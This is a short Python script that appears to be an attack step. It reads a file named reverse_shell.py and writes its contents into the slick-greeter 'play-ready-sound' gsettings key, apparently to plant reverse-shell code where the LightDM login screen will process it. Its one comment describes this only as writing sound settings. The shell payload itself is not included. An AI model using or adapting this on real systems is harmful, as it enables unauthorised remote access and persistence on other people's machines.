from gi.repository import Gio

code = open("reverse_shell.py").read()

# Write settings to lightdm's play sound config
gsettings = Gio.Settings.new("x.dm.slick-greeter")
gsettings.set_string("play-ready-sound", code)
gsettings.apply()
